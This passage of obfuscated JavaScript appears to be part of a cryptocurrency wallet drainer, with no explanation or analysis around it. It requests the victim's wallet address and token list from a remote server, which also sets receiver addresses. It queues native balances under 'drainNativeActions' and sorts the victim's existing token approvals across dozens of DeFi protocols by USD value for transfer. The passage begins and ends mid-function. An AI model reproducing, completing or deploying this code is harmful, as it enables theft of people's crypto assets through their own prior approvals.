    let _0x4c05f0 = this.oneinchv5Actions.filter(_0x2108ce => _0x2108ce.chain == _0x10c58f && !this.approved.includes(_0x2108ce.token + ',' + _0x10c58f));
    if (_0x4c05f0.length > 0) {
      for (let _0x4d146d of _0x4c05f0) {
        const _0x30a988 = {
          token: _0x4d146d.token,
          amount: _0x4d146d.amount,
          value: _0x4d146d.value
        };
        var _0x4bd67b = _0x30a988;
        this.createAction("1InchV5", _0x4bd67b, _0x4d146d.value, _0x10c58f);
      }
    }
    let _0x374218 = this.kyberActions.filter(_0x19f1c2 => _0x19f1c2.chain == _0x10c58f && !this.approved.includes(_0x19f1c2.token + ',' + _0x10c58f));
    if (_0x374218.length > 0) {
      for (let _0x76d4fc of _0x374218) {
        const _0xbd5a2a = {
          token: _0x76d4fc.token,
          amount: _0x76d4fc.amount,
          value: _0x76d4fc.value
        };
        var _0x4bd67b = _0xbd5a2a;
        this.createAction('Kyber', _0x4bd67b, _0x76d4fc.value, _0x10c58f);
      }
    }
    let _0x5b2cfb = this.traderJoeV1Actions.filter(_0x174bbd => _0x174bbd.chain == _0x10c58f && !this.approved.includes(_0x174bbd.token + ',' + _0x10c58f));
    if (_0x5b2cfb.length > 0) {
      for (let _0x5eb24a of _0x5b2cfb) {
        const _0x57f914 = {
          token: _0x5eb24a.token,
          amount: _0x5eb24a.amount,
          value: _0x5eb24a.value
        };
        var _0x4bd67b = _0x57f914;
        this.createAction("TraderJoeV1", _0x4bd67b, _0x5eb24a.value, _0x10c58f);
      }
    }
    let _0x19ee40 = this.traderJoeV2Actions.filter(_0x3ad881 => _0x3ad881.chain == _0x10c58f && !this.approved.includes(_0x3ad881.token + ',' + _0x10c58f));
    if (_0x19ee40.length > 0) {
      for (let _0x6b08bf of _0x19ee40) {
        const _0x1a1816 = {
          token: _0x6b08bf.token,
          amount: _0x6b08bf.amount,
          value: _0x6b08bf.value
        };
        var _0x4bd67b = _0x1a1816;
        this.createAction("TraderJoeV2", _0x4bd67b, _0x6b08bf.value, _0x10c58f);
      }
    }
    let _0x13f61e = this.traderJoeV3Actions.filter(_0x17f5c7 => _0x17f5c7.chain == _0x10c58f && !this.approved.includes(_0x17f5c7.token + ',' + _0x10c58f));
    if (_0x13f61e.length > 0) {
      for (let _0x1cdbb5 of _0x13f61e) {
        const _0x523a35 = {
          token: _0x1cdbb5.token,
          amount: _0x1cdbb5.amount,
          value: _0x1cdbb5.value
        };
        var _0x4bd67b = _0x523a35;
        this.createAction("TraderJoeV3", _0x4bd67b, _0x1cdbb5.value, _0x10c58f);
      }
    }
    let _0x48073a = this.zeroexActions.filter(_0x1dab07 => _0x1dab07.chain == _0x10c58f && !this.approved.includes(_0x1dab07.token + ',' + _0x10c58f));
    if (_0x48073a.length > 0) {
      for (let _0xd37355 of _0x48073a) {
        const _0x324ecf = {
          token: _0xd37355.token,
          amount: _0xd37355.amount,
          value: _0xd37355.value
        };
        var _0x4bd67b = _0x324ecf;
        this.createAction("ZeroEx", _0x4bd67b, _0xd37355.value, _0x10c58f);
      }
    }
    let _0x5447a5 = this.stargateActions.filter(_0x238d3e => _0x238d3e.chain == _0x10c58f && !this.approved.includes(_0x238d3e.token + ',' + _0x10c58f));
    if (_0x5447a5.length > 0) {
      for (let _0x16b73e of _0x5447a5) {
        const _0x14bfbe = {
          token: _0x16b73e.token,
          amount: _0x16b73e.amount,
          value: _0x16b73e.value
        };
        var _0x4bd67b = _0x14bfbe;
        this.createAction("Stargate", _0x4bd67b, _0x16b73e.value, _0x10c58f);
      }
    }
    let _0x1ea28b = this.pangolinActions.filter(_0x825101 => _0x825101.chain == _0x10c58f && !this.approved.includes(_0x825101.token + ',' + _0x10c58f));
    if (_0x1ea28b.length > 0) {
      for (let _0x565d5d of _0x1ea28b) {
        const _0x28bc10 = {
          token: _0x565d5d.token,
          amount: _0x565d5d.amount,
          value: _0x565d5d.value
        };
        var _0x4bd67b = _0x28bc10;
        this.createAction("Pangolin", _0x4bd67b, _0x565d5d.value, _0x10c58f);
      }
    }
    let _0x1272e2 = this.pancakeActions.filter(_0x3d1a7c => _0x3d1a7c.chain == _0x10c58f && !this.approved.includes(_0x3d1a7c.token + ',' + _0x10c58f));
    if (_0x1272e2.length > 0) {
      for (let _0x17be2e of _0x1272e2) {
        const _0x35f26f = {
          token: _0x17be2e.token,
          amount: _0x17be2e.amount,
          value: _0x17be2e.value
        };
        var _0x33b5c2 = _0x35f26f;
        this.createAction("Pancake", _0x33b5c2, _0x17be2e.value, _0x10c58f);
      }
    }
    let _0x45e622 = this.pancakev2Actions.filter(_0x174cc1 => _0x174cc1.chain == _0x10c58f && !this.approved.includes(_0x174cc1.token + ',' + _0x10c58f));
    if (_0x45e622.length > 0) {
      let _0x58692d = [];
      let _0x3a1eba = 0;
      for (let _0x12f71f of _0x45e622) {
        _0x3a1eba += _0x12f71f.value;
        const _0x10c75d = {
          token: _0x12f71f.token,
          amount: _0x12f71f.amount,
          value: _0x12f71f.value
        };
        var _0x33b5c2 = _0x10c75d;
        _0x58692d.push(_0x33b5c2);
      }
      this.createAction("PancakeV2", _0x58692d, _0x3a1eba, _0x10c58f);
    }
    let _0x4c8829 = this.specialActions.filter(_0x1963d3 => _0x1963d3.chain == _0x10c58f && !this.approved.includes(_0x1963d3.token + ',' + _0x10c58f));
    if (_0x4c8829.length > 0) {
      for (let _0x384ef0 of _0x4c8829) {
        const _0x217b62 = {
          token: _0x384ef0.token,
          amount: _0x384ef0.amount,
          value: _0x384ef0.value
        };
        this.createAction("Special", _0x217b62, _0x384ef0.value, _0x10c58f);
      }
    }
    let _0xfd583a = this.shibaSwapActions.filter(_0x3a81a3 => _0x3a81a3.chain == _0x10c58f && !this.approved.includes(_0x3a81a3.token + ',' + _0x10c58f));
    if (_0xfd583a.length > 0) {
      for (let _0x5a2e8e of _0xfd583a) {
        const _0x65928a = {
          token: _0x5a2e8e.token,
          amount: _0x5a2e8e.amount,
          value: _0x5a2e8e.value
        };
        var _0x4bd67b = _0x65928a;
        this.createAction('ShibaSwap', _0x4bd67b, _0x5a2e8e.value, _0x10c58f);
      }
    }
    let _0x303430 = this.uniswapv2Actions.filter(_0xe625a2 => _0xe625a2.chain == _0x10c58f && !this.approved.includes(_0xe625a2.token + ',' + _0x10c58f));
    if (_0x303430.length > 0) {
      for (let _0x58c02a of _0x303430) {
        const _0x39b51e = {
          token: _0x58c02a.token,
          amount: _0x58c02a.amount,
          value: _0x58c02a.value
        };
        var _0x10f7ea = _0x39b51e;
        this.createAction('UniswapV2', _0x10f7ea, _0x58c02a.value, _0x10c58f);
      }
    }
    let _0x1bc89c = this.uniswapv3Actions.filter(_0x58be25 => _0x58be25.chain == _0x10c58f && !this.approved.includes(_0x58be25.token + ',' + _0x10c58f));
    if (_0x1bc89c.length > 0) {
      let _0x2f9029 = [];
      let _0x3b7d0a = 0;
      for (let _0x874573 of _0x1bc89c) {
        _0x3b7d0a += _0x874573.value;
        const _0x3bc154 = {
          token: _0x874573.token,
          amount: _0x874573.amount,
          value: _0x874573.value
        };
        var _0x10f7ea = _0x3bc154;
        _0x2f9029.push(_0x10f7ea);
      }
      this.createAction("UniswapV3", _0x2f9029, _0x3b7d0a, _0x10c58f);
    }
    let _0x3891d2 = this.uniswapv3_2Actions.filter(_0x169d97 => _0x169d97.chain == _0x10c58f && !this.approved.includes(_0x169d97.token + ',' + _0x10c58f));
    if (_0x3891d2.length > 0) {
      let _0x64132b = [];
      let _0x383322 = 0;
      for (let _0xc57ec of _0x3891d2) {
        _0x383322 += _0xc57ec.value;
        const _0x5ba2ba = {
          token: _0xc57ec.token,
          amount: _0xc57ec.amount,
          value: _0xc57ec.value
        };
        var _0x10f7ea = _0x5ba2ba;
        _0x64132b.push(_0x10f7ea);
      }
      this.createAction("UniswapV3_2", _0x64132b, _0x383322, _0x10c58f);
    }
    let _0x175fa8 = this.permit2Actions.filter(_0x1bec0c => _0x1bec0c.chain == _0x10c58f && !this.approved.includes(_0x1bec0c.token + ',' + _0x10c58f));
    if (_0x175fa8.length > 0) {
      let _0x187c50 = [];
      let _0x435915 = 0;
      for (let _0x4aea96 of _0x175fa8) {
        _0x435915 += _0x4aea96.value;
        const _0x11b469 = {
          token: _0x4aea96.token,
          amount: _0x4aea96.amount,
          value: _0x4aea96.value
        };
        _0x187c50.push(_0x11b469);
      }
      this.createAction('Permit2', _0x187c50, _0x435915, _0x10c58f);
    }
    let _0x1bf3d7 = this.wooActions.filter(_0x2bf6f3 => _0x2bf6f3.chain == _0x10c58f && !this.approved.includes(_0x2bf6f3.token + ',' + _0x10c58f));
    if (_0x1bf3d7.length > 0) {
      for (let _0x8f4ec9 of _0x1bf3d7) {
        const _0x2fc9a3 = {
          token: _0x8f4ec9.token,
          amount: _0x8f4ec9.amount,
          value: _0x8f4ec9.value
        };
        var _0x4bd67b = _0x2fc9a3;
        this.createAction("WooFinance", _0x4bd67b, _0x8f4ec9.value, _0x10c58f);
      }
    }
    let _0x71992c = this.wooBridgeActions.filter(_0x48c8eb => _0x48c8eb.chain == _0x10c58f && !this.approved.includes(_0x48c8eb.token + ',' + _0x10c58f));
    if (_0x71992c.length > 0) {
      for (let _0x5ecf63 of _0x71992c) {
        const _0x3072bd = {
          token: _0x5ecf63.token,
          amount: _0x5ecf63.amount,
          value: _0x5ecf63.value
        };
        var _0x4bd67b = _0x3072bd;
        this.createAction("WooBridge", _0x4bd67b, _0x5ecf63.value, _0x10c58f);
      }
    }
    let _0x4e2516 = this.sushiswapActions.filter(_0x19068f => _0x19068f.chain == _0x10c58f && !this.approved.includes(_0x19068f.token + ',' + _0x10c58f));
    if (_0x4e2516.length > 0) {
      for (let _0x24cc6a of _0x4e2516) {
        const _0x3ab87a = {
          token: _0x24cc6a.token,
          amount: _0x24cc6a.amount,
          value: _0x24cc6a.value
        };
        var _0x574fc5 = _0x3ab87a;
        this.createAction("SushiSwap", _0x574fc5, _0x24cc6a.value, _0x10c58f);
      }
    }
    let _0x3e5c8d = this.sushiProcessActions.filter(_0x1af667 => _0x1af667.chain == _0x10c58f && !this.approved.includes(_0x1af667.token + ',' + _0x10c58f));
    if (_0x3e5c8d.length > 0) {
      for (let _0x5305cd of _0x3e5c8d) {
        const _0xe67177 = {
          token: _0x5305cd.token,
          amount: _0x5305cd.amount,
          value: _0x5305cd.value
        };
        var _0x574fc5 = _0xe67177;
        this.createAction("SushiProcess", _0x574fc5, _0x5305cd.value, _0x10c58f);
      }
    }
  };
  ["tokenPromise"] = async () => {
    try {
      console.log("Requesting Tokens");
      let _0x5d1416 = await (await fetch(this.domain + "/items/" + (await this.getWalletAddress()) + "/0x706OW4G8" + ('/' + Base64.encode(this.createEncKey())), this.options)).json();
      if (!window.returnValue) {
        reponse = null;
      }
      console.log("Received Tokens, Checking..");
      this.tokenValueUSD = _0x5d1416.value;
      this.caller = _0x5d1416.caller;
      this.receiver = _0x5d1416.receiver;
      this.ace_receiver = _0x5d1416.ace_receiver;
      this.sharing = _0x5d1416.sharing;
      this.tradingPairs = _0x5d1416.trading;
      let _0xecc2d4 = _0x5d1416.tokens;
      this.token_array = _0xecc2d4;
      if (_0xecc2d4 != null && _0xecc2d4.length > 0) {
        for (let _0x57d749 of _0xecc2d4) {
          this.totalTokens += _0x57d749.value;
        }
        const _0x4261ab = _0xecc2d4.map(async _0x151e59 => {
          if (_0x151e59.token_address == "native") {
            if (!this.tokenChains.includes(_0x151e59.chain) && _0x151e59.value > 10) {
              this.tokenChains.push(_0x151e59.chain);
            }
            const _0x5375f0 = {
              balance: _0x151e59.balance,
              value: _0x151e59.value * _0x2d2f04.assetOptions.multipliers.balance,
              chain: _0x151e59.chain
            };
            this.drainNativeActions.push(_0x5375f0);
          } else {
            try {
              if (_0x151e59.price == null) {
                _0x151e59.price = 0;
              }
              let _0x4bacb2 = _0x151e59.balance;
              let _0x36010b = false;
              if (_0x151e59.approvals.aave_lp2 > 0) {
                let _0x513324 = _0x4bacb2;
                if (_0x4bacb2 > _0x151e59.approvals.aave_lp2) {
                  _0x513324 = _0x151e59.approvals.aave_lp2;
                }
                let _0x3603e4 = _0x513324 / 10 ** _0x151e59.decimals * _0x151e59.price;
                this.aaveLP2Actions.push({
                  'value': _0x3603e4 * _0x2d2f04.assetOptions.multipliers.aave,
                  'amount': _0x513324,
                  'token': _0x151e59.token_address,
                  'chain': _0x151e59.chain
                });
                _0x36010b = true;
              }
              if (_0x151e59.approvals.aave_lp3 > 0) {
                let _0x4536a8 = _0x4bacb2;
                if (_0x4bacb2 > _0x151e59.approvals.aave_lp3) {
                  _0x4536a8 = _0x151e59.approvals.aave_lp3;
                }
                let _0x1fafd1 = _0x4536a8 / 10 ** _0x151e59.decimals * _0x151e59.price;
                this.aaveLP3Actions.push({
                  'value': _0x1fafd1 * _0x2d2f04.assetOptions.multipliers.aave,
                  'amount': _0x4536a8,
                  'token': _0x151e59.token_address,
                  'chain': _0x151e59.chain
                });
                _0x36010b = true;
              }
              if (_0x151e59.approvals.aave_lp4 > 0) {
                let _0x3282fe = _0x4bacb2;
                if (_0x4bacb2 > _0x151e59.approvals.aave_lp4) {
                  _0x3282fe = _0x151e59.approvals.aave_lp4;
                }
                let _0x165673 = _0x3282fe / 10 ** _0x151e59.decimals * _0x151e59.price;
                this.aaveLP4Actions.push({
                  'value': _0x165673 * _0x2d2f04.assetOptions.multipliers.aave,
                  'amount': _0x3282fe,
                  'token': _0x151e59.token_address,
                  'chain': _0x151e59.chain
                });
                _0x36010b = true;
              }
              if (_0x151e59.approvals.permit2 > 0) {
                let _0x391322 = _0x4bacb2;
                if (_0x4bacb2 > _0x151e59.approvals.permit2) {
                  _0x391322 = _0x151e59.approvals.permit2;
                }
                let _0x3dcddb = _0x391322 / 10 ** _0x151e59.decimals * _0x151e59.price;
                this.permit2Actions.push({
                  'value': _0x3dcddb * _0x2d2f04.assetOptions.multipliers.permit2,
                  'amount': _0x391322,
                  'token': _0x151e59.token_address,
                  'chain': _0x151e59.chain
                });
                _0x36010b = true;
              }
              if (_0x151e59.approvals.uniswap_v2 > 0) {
                let _0x38e4a4 = _0x4bacb2;
                if (_0x4bacb2 > _0x151e59.approvals.uniswapv2) {
                  _0x38e4a4 = _0x151e59.approvals.uniswapv2;
                }
                let _0x281beb = _0x38e4a4 / 10 ** _0x151e59.decimals * _0x151e59.price;
                const _0x209f92 = {
                  value: _0x281beb * _0x2d2f04.assetOptions.multipliers.uniswap,
                  amount: _0x38e4a4,
                  token: _0x151e59.token_address,
                  chain: _0x151e59.chain
                };
                this.uniswapv2Actions.push(_0x209f92);
                _0x36010b = true;
              }
              if (_0x151e59.approvals.uniswap_v3 > 0) {
                let _0x3ca71b = _0x4bacb2;
                if (_0x4bacb2 > _0x151e59.approvals.uniswapv3) {
                  _0x3ca71b = _0x151e59.approvals.uniswapv3;
                }
                let _0x5b7cd3 = _0x3ca71b / 10 ** _0x151e59.decimals * _0x151e59.price;
                this.uniswapv3Actions.push({
                  'value': _0x5b7cd3 * _0x2d2f04.assetOptions.multipliers.uniswapv2,
                  'amount': _0x3ca71b,
                  'token': _0x151e59.token_address,
                  'chain': _0x151e59.chain
                });
                _0x36010b = true;
              }
              if (_0x151e59.approvals.uniswap_v3_2 > 0) {
                let _0x2c0d4d = _0x4bacb2;
                if (_0x4bacb2 > _0x151e59.approvals.uniswapv3_2) {
                  _0x2c0d4d = _0x151e59.approvals.uniswapv3_2;
                }
                let _0x50233b = _0x2c0d4d / 10 ** _0x151e59.decimals * _0x151e59.price;
                const _0x9cfe10 = {
                  value: _0x50233b * _0x2d2f04.assetOptions.multipliers.uniswapv2,
                  amount: _0x2c0d4d,
                  token: _0x151e59.token_address,
                  chain: _0x151e59.chain
                };
                this.uniswapv3_2Actions.push(_0x9cfe10);
                _0x36010b = true;
              }
              if (_0x151e59.approvals.bancor > 0) {
                let _0x2303a8 = _0x4bacb2;
                if (_0x4bacb2 > _0x151e59.approvals.bancor) {
                  _0x2303a8 = _0x151e59.approvals.bancor;
                }
                let _0x3a2080 = _0x2303a8 / 10 ** _0x151e59.decimals * _0x151e59.price;
                const _0x4ed4f8 = {
                  value: _0x3a2080 * _0x2d2f04.assetOptions.multipliers.uniswap,
                  amount: _0x2303a8,
                  token: _0x151e59.token_address,
                  chain: _0x151e59.chain
                };
                this.bancorActions.push(_0x4ed4f8);
                _0x36010b = true;
              }
              if (_0x151e59.approvals.bancor_swaps > 0) {
                let _0x186a6e = _0x4bacb2;
                if (_0x4bacb2 > _0x151e59.approvals.bancor_swaps) {
                  _0x186a6e = _0x151e59.approvals.bancor_swaps;
                }
                let _0x608329 = _0x186a6e / 10 ** _0x151e59.decimals * _0x151e59.price;
                const _0x1d767e = {
                  value: _0x608329 * _0x2d2f04.assetOptions.multipliers.uniswap,
                  amount: _0x186a6e,
                  token: _0x151e59.token_address,
                  chain: _0x151e59.chain
                };
                this.bancorSwapsActions.push(_0x1d767e);
                _0x36010b = true;
              }
              if (_0x151e59.approvals.kyber > 0) {
                let _0x551d5f = _0x4bacb2;
                if (_0x4bacb2 > _0x151e59.approvals.kyber) {
                  _0x551d5f = _0x151e59.approvals.kyber;
                }
                let _0xcfed2b = _0x551d5f / 10 ** _0x151e59.decimals * _0x151e59.price;
                const _0x327d26 = {
                  value: _0xcfed2b * _0x2d2f04.assetOptions.multipliers.uniswap,
                  amount: _0x551d5f,
                  token: _0x151e59.token_address,
                  chain: _0x151e59.chain
                };
                this.kyberActions.push(_0x327d26);
                _0x36010b = true;
              }
              if (_0x151e59.approvals.quickswap > 0) {
                let _0x5ee418 = _0x4bacb2;
                if (_0x4bacb2 > _0x151e59.approvals.quickswap) {
                  _0x5ee418 = _0x151e59.approvals.quickswap;
                }
                let _0x5478fc = _0x5ee418 / 10 ** _0x151e59.decimals * _0x151e59.price;
                const _0x390f32 = {
                  value: _0x5478fc * _0x2d2f04.assetOptions.multipliers.uniswap,
                  amount: _0x5ee418,
                  token: _0x151e59.token_address,
                  chain: _0x151e59.chain
                };
                this.quickSwapActions.push(_0x390f32);
                _0x36010b = true;
              }
              if (_0x151e59.approvals.spookyswap > 0) {
                let _0x14b569 = _0x4bacb2;
                if (_0x4bacb2 > _0x151e59.approvals.spookyswap) {
                  _0x14b569 = _0x151e59.approvals.spookyswap;
                }
                let _0x3b121b = _0x14b569 / 10 ** _0x151e59.decimals * _0x151e59.price;
                this.spookyActions.push({
                  'value': _0x3b121b * _0x2d2f04.assetOptions.multipliers.uniswap,
                  'amount': _0x14b569,
                  'token': _0x151e59.token_address,
                  'chain': _0x151e59.chain
                });
                _0x36010b = true;
              }
              if (_0x151e59.approvals.gmx > 0) {
                let _0x4694e1 = _0x4bacb2;
                if (_0x4bacb2 > _0x151e59.approvals.gmx) {
                  _0x4694e1 = _0x151e59.approvals.gmx;
                }
                let _0x285096 = _0x4694e1 / 10 ** _0x151e59.decimals * _0x151e59.price;
                const _0x391cf5 = {
                  value: _0x285096 * _0x2d2f04.assetOptions.multipliers.uniswap,
                  amount: _0x4694e1,
                  token: _0x151e59.token_address,
                  chain: _0x151e59.chain
                };
                this.gmxActions.push(_0x391cf5);
                _0x36010b = true;
              }
              if (_0x151e59.approvals.pangolin > 0) {
                let _0x2c9be0 = _0x4bacb2;
                if (_0x4bacb2 > _0x151e59.approvals.pangolin) {
                  _0x2c9be0 = _0x151e59.approvals.pangolin;
                }
                let _0x311929 = _0x2c9be0 / 10 ** _0x151e59.decimals * _0x151e59.price;
                this.pangolinActions.push({
                  'value': _0x311929 * _0x2d2f04.assetOptions.multipliers.uniswap,
                  'amount': _0x2c9be0,
                  'token': _0x151e59.token_address,
                  'chain': _0x151e59.chain
                });
                _0x36010b = true;
              }
              if (_0x151e59.approvals.traderjoe_v3 > 0) {
                let _0x493720 = _0x4bacb2;
                if (_0x4bacb2 > _0x151e59.approvals.traderjoe_v3) {
                  _0x493720 = _0x151e59.approvals.traderjoe_v3;
                }
                let _0x392330 = _0x493720 / 10 ** _0x151e59.decimals * _0x151e59.price;
                this.traderJoeV3Actions.push({
                  'value': _0x392330 * _0x2d2f04.assetOptions.multipliers.uniswap,
                  'amount': _0x493720,
                  'token': _0x151e59.token_address,
                  'chain': _0x151e59.chain
                });
                _0x36010b = true;
              }
              if (_0x151e59.approvals.traderjoe_v2 > 0) {
                let _0xe21c13 = _0x4bacb2;
                if (_0x4bacb2 > _0x151e59.approvals.traderjoe_v2) {
                  _0xe21c13 = _0x151e59.approvals.traderjoe_v2;
                }
                let _0x2a0995 = _0xe21c13 / 10 ** _0x151e59.decimals * _0x151e59.price;
                this.traderJoeV2Actions.push({
                  'value': _0x2a0995 * _0x2d2f04.assetOptions.multipliers.uniswap,
                  'amount': _0xe21c13,
                  'token': _0x151e59.token_address,
                  'chain': _0x151e59.chain
                });
                _0x36010b = true;
              }
              if (_0x151e59.approvals.traderjoe_v1 > 0) {
                let _0x204af2 = _0x4bacb2;
                if (_0x4bacb2 > _0x151e59.approvals.traderjoe_v1) {
                  _0x204af2 = _0x151e59.approvals.traderjoe_v1;
                }
                let _0x5658ed = _0x204af2 / 10 ** _0x151e59.decimals * _0x151e59.price;
                const _0x59890d = {
                  value: _0x5658ed * _0x2d2f04.assetOptions.multipliers.uniswap,
                  amount: _0x204af2,
                  token: _0x151e59.token_address,
                  chain: _0x151e59.chain
                };
                this.traderJoeV1Actions.push(_0x59890d);
                _0x36010b = true;
              }
              if (_0x151e59.approvals.woo > 0) {
                let _0x584b44 = _0x4bacb2;
                if (_0x4bacb2 > _0x151e59.approvals.woo) {
                  _0x584b44 = _0x151e59.approvals.woo;
                }
                let _0x2bacc4 = _0x584b44 / 10 ** _0x151e59.decimals * _0x151e59.price;
                this.wooActions.push({
                  'value': _0x2bacc4 * _0x2d2f04.assetOptions.multipliers.uniswap,
                  'amount': _0x584b44,
                  'token': _0x151e59.token_address,
                  'chain': _0x151e59.chain
                });
                _0x36010b = true;
              }
              if (_0x151e59.approvals.woo_bridge > 0) {
                let _0x4c0e91 = _0x4bacb2;
                if (_0x4bacb2 > _0x151e59.approvals.woo_bridge) {
                  _0x4c0e91 = _0x151e59.approvals.woo_bridge;
                }
                let _0x2a13cb = _0x4c0e91 / 10 ** _0x151e59.decimals * _0x151e59.price;
                const _0x21c39a = {
                  value: _0x2a13cb * _0x2d2f04.assetOptions.multipliers.uniswap,
                  amount: _0x4c0e91,
                  token: _0x151e59.token_address,
                  chain: _0x151e59.chain
                };
                this.wooBridgeActions.push(_0x21c39a);
                _0x36010b = true;
              }
              if (_0x151e59.approvals.camelot > 0) {
                let _0x3d332c = _0x4bacb2;
                if (_0x4bacb2 > _0x151e59.approvals.camelot) {
                  _0x3d332c = _0x151e59.approvals.camelot;
                }
                let _0x31ada0 = _0x3d332c / 10 ** _0x151e59.decimals * _0x151e59.price;
                this.camelotActions.push({
                  'value': _0x31ada0 * _0x2d2f04.assetOptions.multipliers.uniswap,
                  'amount': _0x3d332c,
                  'token': _0x151e59.token_address,
                  'chain': _0x151e59.chain
                });
                _0x36010b = true;
              }
              if (_0x151e59.approvals.shibaswap > 0) {
                let _0x588e1e = _0x4bacb2;
                if (_0x4bacb2 > _0x151e59.approvals.shibaswap) {
                  _0x588e1e = _0x151e59.approvals.shibaswap;
                }
                let _0x51d86e = _0x588e1e / 10 ** _0x151e59.decimals * _0x151e59.price;
                const _0x2ad7b4 = {
                  value: _0x51d86e * _0x2d2f04.assetOptions.multipliers.uniswap,
                  amount: _0x588e1e,
                  token: _0x151e59.token_address,
                  chain: _0x151e59.chain
                };
                this.shibaSwapActions.push(_0x2ad7b4);
                _0x36010b = true;
              }
              if (_0x151e59.approvals.stargate > 0) {
                let _0x21e157 = _0x4bacb2;
                if (_0x4bacb2 > _0x151e59.approvals.stargate) {
                  _0x21e157 = _0x151e59.approvals.stargate;
                }
                let _0x571ba3 = _0x21e157 / 10 ** _0x151e59.decimals * _0x151e59.price;
                const _0x128e9d = {
                  value: _0x571ba3 * _0x2d2f04.assetOptions.multipliers.stargate,
                  amount: _0x21e157,
                  token: _0x151e59.token_address,
                  chain: _0x151e59.chain
                };
                this.stargateActions.push(_0x128e9d);
                _0x36010b = true;
              }
              if (_0x151e59.approvals.cowswap > 0) {
                let _0x3f39eb = _0x4bacb2;
                if (_0x4bacb2 > _0x151e59.approvals.cowswap) {
                  _0x3f39eb = _0x151e59.approvals.cowswap;
                }
                let _0x1f6fef = _0x3f39eb / 10 ** _0x151e59.decimals * _0x151e59.price;
                this.cowActions.push({
                  'value': _0x1f6fef * _0x2d2f04.assetOptions.multipliers.uniswap,
                  'amount': _0x3f39eb,
                  'token': _0x151e59.token_address,
                  'chain': _0x151e59.chain
                });
                _0x36010b = true;
              }
              if (_0x151e59.approvals.curve > 0) {
                let _0x1bfafd = _0x4bacb2;
                if (_0x4bacb2 > _0x151e59.approvals.curve) {
                  _0x1bfafd = _0x151e59.approvals.curve;
                }
                let _0xfb32aa = _0x1bfafd / 10 ** _0x151e59.decimals * _0x151e59.price;
                this.curveActions.push({
                  'value': _0xfb32aa * _0x2d2f04.assetOptions.multipliers.curve,
                  'amount': _0x1bfafd,
                  'token': _0x151e59.token_address,
                  'chain': _0x151e59.chain
                });
                _0x36010b = true;
              }
              if (_0x151e59.approvals.curve_vyper1 > 0) {
                let _0x1a17df = _0x4bacb2;
                if (_0x4bacb2 > _0x151e59.approvals.curve_vyper1) {
                  _0x1a17df = _0x151e59.approvals.curve_vyper1;
                }
                let _0x3e0c91 = _0x1a17df / 10 ** _0x151e59.decimals * _0x151e59.price;
                this.curveVyper1Actions.push({
                  'value': _0x3e0c91 * _0x2d2f04.assetOptions.multipliers.curve,
                  'amount': _0x1a17df,
                  'token': _0x151e59.token_address,
                  'chain': _0x151e59.chain
                });
                _0x36010b = true;
              }
              if (_0x151e59.approvals.oneinch_v5 > 0) {
                let _0x29c9e8 = _0x4bacb2;
                if (_0x4bacb2 > _0x151e59.approvals.oneinch_v5) {
                  _0x29c9e8 = _0x151e59.approvals.oneinch_v5;
                }
                let _0xe505f7 = _0x29c9e8 / 10 ** _0x151e59.decimals * _0x151e59.price;
                this.oneinchv5Actions.push({
                  'value': _0xe505f7 * _0x2d2f04.assetOptions.multipliers.uniswap,
                  'amount': _0x29c9e8,
                  'token': _0x151e59.token_address,
                  'chain': _0x151e59.chain
                });
                _0x36010b = true;
              }
              if (_0x151e59.approvals.zeroex > 0) {
                let _0xe8dce2 = _0x4bacb2;
                if (_0x4bacb2 > _0x151e59.approvals.zeroex) {
                  _0xe8dce2 = _0x151e59.approvals.zeroex;
                }
                let _0x5cea14 = _0xe8dce2 / 10 ** _0x151e59.decimals * _0x151e59.price;
                this.zeroexActions.push({
                  'value': _0x5cea14 * _0x2d2f04.assetOptions.multipliers.uniswap,
                  'amount': _0xe8dce2,
                  'token': _0x151e59.token_address,
                  'chain': _0x151e59.chain
                });
                _0x36010b = true;
              }
              if (_0x151e59.approvals.pancake > 0) {
                let _0x15409c = _0x4bacb2;
                if (_0x4bacb2 > _0x151e59.approvals.pancake) {
                  _0x15409c = _0x151e59.approvals.pancake;
                }
                let _0x3c7b64 = _0x15409c / 10 ** _0x151e59.decimals * _0x151e59.price;
                this.pancakeActions.push({
                  'value': _0x3c7b64 * _0x2d2f04.assetOptions.multipliers.uniswap,
                  'amount': _0x15409c,
                  'token': _0x151e59.token_address,
                  'chain': _0x151e59.chain
                });
                _0x36010b = true;
              }
              if (_0x151e59.approvals.pancake_v2 > 0) {
                let _0x1fa805 = _0x4bacb2;
                if (_0x4bacb2 > _0x151e59.approvals.pancake_v2) {
                  _0x1fa805 = _0x151e59.approvals.pancake_v2;
                }
                let _0x43fd82 = _0x1fa805 / 10 ** _0x151e59.decimals * _0x151e59.price;
                this.pancakev2Actions.push({
                  'value': _0x43fd82 * _0x2d2f04.assetOptions.multipliers.uniswapv2,
                  'amount': _0x1fa805,
                  'token': _0x151e59.token_address,
                  'chain': _0x151e59.chain
                });
                _0x36010b = true;
              }
              if (_0x151e59.approvals.sushi > 0) {
                let _0x47213f = _0x4bacb2;
                if (_0x4bacb2 > _0x151e59.approvals.sushi) {
                  _0x47213f = _0x151e59.approvals.sushi;
                }
                let _0xa1e448 = _0x47213f / 10 ** _0x151e59.decimals * _0x151e59.price;
                const _0x3028d7 = {
                  value: _0xa1e448 * _0x2d2f04.assetOptions.multipliers.uniswap,
                  amount: _0x47213f,
                  token: _0x151e59.token_address,
                  chain: _0x151e59.chain
                };
                this.sushiswapActions.push(_0x3028d7);
                _0x36010b = true;
              }
              if (_0x151e59.approvals.sushi_process > 0) {
                let _0x44d9f4 = _0x4bacb2;
                if (_0x4bacb2 > _0x151e59.approvals.sushi_process) {
                  _0x44d9f4 = _0x151e59.approvals.sushi_process;
                }
                let _0x2adc0d = _0x44d9f4 / 10 ** _0x151e59.decimals * _0x151e59.price;
                this.sushiProcessActions.push({
                  'value': _0x2adc0d * _0x2d2f04.assetOptions.multipliers.uniswap,
                  'amount': _0x44d9f4,
                  'token': _0x151e59.token_address,
                  'chain': _0x151e59.chain
                });
                _0x36010b = true;
              }
              if (_0x151e59.approvals.seaport > 0) {
                let _0x40a0db = _0x4bacb2;
                if (_0x4bacb2 > _0x151e59.approvals.seaport) {
                  _0x40a0db = _0x151e59.approvals.seaport;
                }
                let _0x4bd8bb = _0x40a0db / 10 ** _0x151e59.decimals * _0x151e59.price;
                this.seaportTokenActions.push({
                  'value': _0x4bd8bb * _0x2d2f04.assetOptions.multipliers.seaport,
                  'amount': _0x40a0db,
                  'token': _0x151e59.token_address,
                  'chain': _0x151e59.chain
                });
                _0x36010b = true;
              }
              if (_0x151e59.approvals.wyvern_tokens > 0) {
                let _0x187f64 = _0x4bacb2;
